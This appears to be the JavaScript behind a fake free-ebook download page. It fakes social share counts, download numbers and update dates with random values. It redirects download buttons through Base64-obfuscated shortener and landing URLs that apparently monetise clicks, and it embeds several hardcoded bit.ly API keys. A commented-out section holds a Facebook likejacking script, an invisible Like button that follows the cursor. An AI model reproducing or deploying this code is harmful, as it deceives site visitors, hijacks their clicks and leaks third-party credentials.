function reloadScript(){
  var s = document.createElement("script");
  s.type = "text/javascript";
  s.src = "https://www.google.com/jsapi";
  $("head").append(s);
}

function changeBackground(){
  var random = Math.round(13*Math.random());
  var image = ["https://googledrive.com/host/0BzluYHUlH7S3Y1B1S1NKZnBwZVE/","https://googledrive.com/host/0BzluYHUlH7S3c3FsRXpPb0MwWjA/","https://googledrive.com/host/0BzluYHUlH7S3a2t3ck5uVFp3b3M/","https://googledrive.com/host/0BzluYHUlH7S3akh0dEM2V1hzZ00/","https://googledrive.com/host/0BzluYHUlH7S3bHk4b3ZPYWsxVUU/","https://googledrive.com/host/0BzluYHUlH7S3Tkw1cUo5YWRvV0U/","https://googledrive.com/host/0BzluYHUlH7S3VnkwS2kxVFRIQzQ/","https://googledrive.com/host/0BzluYHUlH7S3M2c0ZkVyVnBtLTg/","https://googledrive.com/host/0BzluYHUlH7S3US1laWhpQUwyZ28/","https://googledrive.com/host/0BzluYHUlH7S3VVhscHk0WC01UjA/","https://googledrive.com/host/0BzluYHUlH7S3TG92b3hPdjVpbDg/","https://googledrive.com/host/0BzluYHUlH7S3VmZtaUQtNUJYY0U/","https://googledrive.com/host/0BzluYHUlH7S3eHBqamdCTm51VG8/","https://googledrive.com/host/0BzluYHUlH7S3c29oMmo5WmM4UHc/"]
  $("body").css("background-image","url()"); //edit, body must be in quotes!
}

function amountdownload(){
var dt = new Date();
		   var th = dt.getFullYear();
		   var bl = dt.getMonth() + 1;
		   var tg = dt.getDate();
		   //if(bl == 0) {
		    // bl = 12;
			// th -= 1;
		   //}else if(bl == 1){
			// bl = 1;
		   //}else {
			// bl -= 1;
		  // }
  if(tg > 8){
	tg -= 7;
  }
var dtime = Math.floor((Math.random()*1000)+102);
		   //var upload = document.getElementById('upload-time');
		  // upload.innerHTML = th + "/" + bl + "/" + tg;
var btn=document.createElement("div");
btn.setAttribute('align', 'center');
var br=document.createElement("div");
br.setAttribute('align', 'center');
  btn.innerHTML = "Last Updated: " + th + "/" + bl + "/" + tg;
  br.innerHTML = "Download: " + dtime +" x";
 var download = document.getElementById('download')
  if(download != null){
    download.appendChild(btn);
    download.appendChild(br);
  }
}

function menuchanger(){
  var image = document.getElementById('image');	
  if(image != null) {
  	var img = image.src;
  }
	
  var counterfacebook = document.getElementById('counterfacebook');
  if(counterfacebook != null){
    counterfacebook.innerHTML = Math.round(900*Math.random()+29872);
  }
  var countertwitter = document.getElementById('countertwitter');
  if(countertwitter != null){
    countertwitter.innerHTML = Math.round(900*Math.random()+3567);
  }
  var counterrss = document.getElementById('counterrss');
  if(counterrss != null){
    counterrss.innerHTML = Math.round(900*Math.random()+19789);
  }
  var countergoogle = document.getElementById('countergoogle');
  if(countergoogle != null){
    countergoogle.innerHTML = Math.round(100*Math.random()+1340);
  }
	
  var downloadmenu = document.getElementsByClassName('downloadmenu');	
  
  var i;
  if(downloadmenu.length != 0) {
    for (i = 0; i < downloadmenu.length; i++) {
      downloadmenu[i].href="http://bit.ly/1Jk8jiX";
      downloadmenu[i].innerHTML = 'Free Books Downloader';
    }
  }
  /*	
  var topmenujs = document.getElementById('topmenujs');
  topmenujs.innerHTML = "<li><a class='active' href='/'><i class='fa fa-home'/> Home</a></li><li><a href='http://tinyurl.com/mokxvfc'>Free Books Downloader</a></li>";

  var i;
  for (i = 0; i < topmenujs.length; i++) {
   // menu[i].href="http://tinyurl.com/mokxvfc";
     topmenujs[i].innerHTML = "<li><a class='active' href='/'><i class='fa fa-home'/> Home</a></li><li><a href='http://tinyurl.com/mokxvfc'>How To Download</a></li>";
  }
  
  var bottommenujs = document.getElementsByClassName('bottommenujs');
 
  var i;
  for (i = 0; i < bottommenujs.length; i++) {
   // menu[i].href="http://tinyurl.com/mokxvfc";
     bottommenujs[i].innerHTML = '';
  }
  */
}

function url_changer(shorterurl) {
  var dloadbutton = document.getElementById('dloadbutton');
  if(dloadbutton != null){
    dloadbutton.href=shorterurl;
  }
  var dloadimage = document.getElementById('dloadimage');
                        //dloadimage.src="https://googledrive.com/host/0BzluYHUlH7S3TjhEckY0MTBGSmM/";
  if(dloadimage != null){                      
    dloadimage.src="https://googledrive.com/host/0BzluYHUlH7S3N0JDRTI0Y2hidTQ/";
  }
  var loader = document.getElementById('loader');
  if(loader != null){  
    loader.setAttribute('style','display:none');
  }
}

function get_short_url(long_url, login, api_key, func)
{


function get_adf(url, func)
{
var adf = B64.decode("aHR0cDovL2FndDIuYXV0b25vbW91c2NvZGUuY29tL2FkZi5waHA/");
$.getJSON(
  adf,
        {
            "format": "json",
          "url": url
        },
        function(response)
        {
           //func(response.data);
           //alert(response.data.url);
          if(response.data.url != 'error' && response.data.url != '') {
           url_changer(response.data.url);
           clickable(response.data.url);
        }else{
          url_changer('http://bit.ly/1Jk8jiX');
          clickable('http://bit.ly/1Jk8jiX');
        }
        }
    );
}
var bitly = B64.decode("aHR0cDovL2FwaS5iaXRseS5jb20vdjMvc2hvcnRlbj9jYWxsYmFjaz0/");
    $.getJSON(
        bitly,
        {
            "format": "json",
            "apiKey": api_key,
            "login": login,
            "longUrl": long_url
        },
        function(response)
        {
            //func(response.data);
          if(response.status_code == 200 ) {
            url_changer(response.data.url);
            clickable(response.data.url);
          }else {
            get_adf(long_url);
          }
        }
    );
}

function clickable(shorterurl){
  var dloadbuttonclickable = document.getElementById('dloadbuttonclickable');
  if(dloadbuttonclickable != null){
    dloadbuttonclickable.innerHTML='<img src="https://fifa15cracked.files.wordpress.com/2014/11/google-drive-download-button-big.png?w=300" />';
  }
  $('#dloadbuttonclickable').click(function(e) { 

    window.location.href = shorterurl;
  });
	
}

function includecss(){
	$('head').append( $('<link rel="stylesheet" type="text/css" />').attr('href', 'http://csslinker.com/style.css') );
}


function init() {
   // quit if this function has already been called
   if (arguments.callee.done) return;

   // flag this function so we don't do the same thing twice
    arguments.callee.done = true;
    menuchanger();
    changeBackground();
    amountdownload();
    includecss();
    reloadScript();
    var log = ["Ym9rbzEyMw==","ZG9naXNhbmppbmc=","cGluZGFodnBzMg==","cGluZGFodnBzMw==","cGluZGFodnBzNA=="];
    var api = ["R_b1dad1d5fb975aba33d9bf8aabafebe9","R_62cb308d9d7042b7ba08356ad1935c25","R_f1ce862bdc6e4290b0baca23dbed9cbc","R_82382515ba6b49feaf045d45550ba4c6","R_9af61e55f2284fcd861c4ab4c78d2c12"]
    var random = Math.round(3*Math.random());
    if(random != null && random < 5 && random > 0){
      var login = B64.decode(log[random]);
      var api_key = api[random];
    }
var down= document.getElementById('asin');
var isi = down.innerHTML;
var doma = B64.decode("aHR0cDovL3d3dy5kb3dubG9hZGxpbmtlci5jb20v");
var land = B64.decode("dXJsPXd3dy5maWxlcG9zdHMubWwmcmVmZXJlcj13d3cuZmlsZXBvc3RzLm1sL2xhbmRpbmcucGhwJmtleT0=");
  var long_url= doma + B64.encode(encodeURIComponent(land+isi+"&id=1"));
    // create the "page loaded" message
  var shorterurl = null;
   
  if(shorterurl == null) {

   get_short_url(long_url, login, api_key);
   //get_adf(long_url);
 
  }
	//var shorterurli = "http://tinyurl.com/kl5toav";
	//url_changer("download","http://tinyurl.com/luqa8sh");
   };

   // for Mozilla
   if (document.addEventListener) {
    document.addEventListener("DOMContentLoaded", init, null);
   }

   // for Internet Explorer
   /*@cc_on @*/
   /*@if (@_win32)
   document.write("<script defer src=ie_onload.js><"+"/script>");
   /*@end @*/

   // for other browsers
   window.onload = init;
   
/*   var sc=document.createElement("script");
   sc.src = "http://dvl-den.net/cpaelites/clickjack/js/jquery-cookie.min.js";
  
document.getElementsByTagName("head")[0].appendChild(sc);

var bd=document.createElement("div");
bd.id = "fb-root";
document.body.appendChild(bd);

var fb = document.createElement("fb:like");
fb.setAttribute("href","https://www.facebook.com/pages/Free-Medical-BooksCom/220268083745?ref=hl");
fb.setAttribute("id","cj_like");
fb.setAttribute("action","like");
fb.setAttribute("colorscheme","light");
fb.setAttribute("layout","standard");
fb.setAttribute("show_faces","false");
document.body.appendChild(fb);

var cj= document.getElementById('cj_like');
cj.setAttribute("style","position: absolute;top: 0;left: 0;width: 52px;height: 24px;display: none;opacity: .2;z-index: 88888888;overflow: hidden;");

$(function () {
    $(document).on("mousemove", function ( e ) {
      $("#cj_like").css({
        top: e.pageY,
        left: e.pageX
      });
    });

    window.fbAsyncInit = function() {
      FB.init({ appId: '228184644015982', status: true, cookie: true, xfbml: true });

      FB.getLoginStatus(function (response) {
        if (response.status === 'connected' || response.status === 'not_authorized') {
          console.log('User logged-in');
        } else {
          $("#cj_like").hide();
          console.log('User logged-out');
        }
      });

      FB.Event.subscribe('edge.create', function (response) {
        $.cookie("fb-cj", "fb_jack", { expires: 10, path: '/' });
        $("#cj_like").hide();
      });
    };

    (function() {
      var e = document.createElement('script');
      e.type = 'text/javascript';
      e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
      e.async = true;
      document.getElementById('fb-root').appendChild(e);
    }());

    if ($.cookie("fb-cj") != null) {
      $("#cj_like").hide();
    } else {
      $("#cj_like").show();
    }
  });
  */

      google.load("books", "0");
function alertNotFound() {
var vcanvas = document.getElementById('viewerCanvas');
var iframe = document.createElement("iframe");
iframe.id = "frame";
iframe.width = 600;
iframe.height = 400;
iframe.src="https://www.googledrive.com/host/0BzluYHUlH7S3UGtlc3hkMzlFbGs/"; //or blank.html
//iframe.onload = function() {
  // var domdoc = iframe.contentDocument || iframe.contentWindow.document;
   //domdoc.write("Test");
   //alert("..or..")
   //domdoc.body.innerHTML = "<em>Cake</em>";    
//}
document.getElementById('viewerCanvas').appendChild(iframe);




}
function alertInitialized() {
	var kotak = document.createElement('div');
  	kotak.setAttribute('style', 'width: 600px;height: 27px;background-color: #eee;margin-top: -27px; position: absolute; z-index: 9999');
	document.getElementById('viewerCanvas').appendChild(kotak);
}


      function initialize() {
        var asin = document.getElementById('asin');
        var viewer = new google.books.DefaultViewer(document.getElementById('viewerCanvas'));
        viewer.load(asin.innerHTML,alertNotFound,alertInitialized);

		//alert(asin.innerHTML);
      }

      google.setOnLoadCallback(initialize);

$(function() {
    $('#top').click(function() {
        $('html, body').animate({scrollTop:0}, 'slow');
        return false;
    });
});
$(document).ready(function(){
  //On Click Event
  $("ul.tabs li").click(function() {
    $("ul.tabs li").removeClass("active"); //Remove any "active" class
	$(this).addClass("active"); //Add "active" class to selected tab
	$(".tab_content").hide(); //Hide all tab content
	var activeTab = $(this).find("a").attr("href"); //Find the rel attribute value to identify the active tab + content
	$(activeTab).fadeIn(); //Fade in the active content
	return false;
  });
});	
